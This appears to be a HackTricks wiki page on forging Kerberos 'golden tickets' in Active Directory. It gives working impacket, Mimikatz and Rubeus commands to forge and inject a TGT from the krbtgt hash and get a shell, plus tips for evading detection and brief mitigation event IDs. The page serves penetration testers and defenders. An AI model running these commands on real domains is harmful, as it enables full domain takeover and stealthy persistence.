# Golden Ticket

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Golden ticket

A valid **TGT as any user** can be created **using the NTLM hash of the krbtgt AD account**. The advantage of forging a TGT instead of TGS is being **able to access any service** (or machine) in the domain and the impersonated user.\
Moreover the **credentials** of **krbtgt** are **never** **changed** automatically.

The **krbtgt** account **NTLM hash** can be **obtained** from the **lsass process** or from the **NTDS.dit file** of any DC in the domain. It is also possible to get that NTLM through a **DCsync attack**, which can be performed either with the [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) module of Mimikatz or the impacket example [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Usually, **domain admin privileges or similar are required**, no matter what technique is used.

It also must be taken into account that it is possible AND **PREFERABLE** (opsec) to **forge tickets using the AES Kerberos keys (AES128 and AES256)**.

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="From Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like yo can not get a shell via winrm).

### Bypassing common detections

The most frequent ways to detect a golden ticket are by **inspecting Kerberos traffic** on the wire.  By default, Mimikatz **signs the TGT for 10 years**, which will stand out as anomalous in subsequent TGS requests made with it.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).

```
Get-DomainPolicy | select -expand KerberosPolicy
```

Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find this information in the Windows event logs.  However, what you can correlate is **seeing 4769's **_**without**_** a prior 4768**.  It's **not possible to request a TGS without a TGT**, and if there is no record of a TGT being issued, we can infer that it was forged offline.

In order to **bypass this detection** check the diamond tickets:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigation

* 4624: Account Logon
* 4672: Admin Logon
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Other little tricks defenders can do is **alert on 4769's for sensitive users** such as the default domain administrator account.

[**More information about Golden Ticket in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
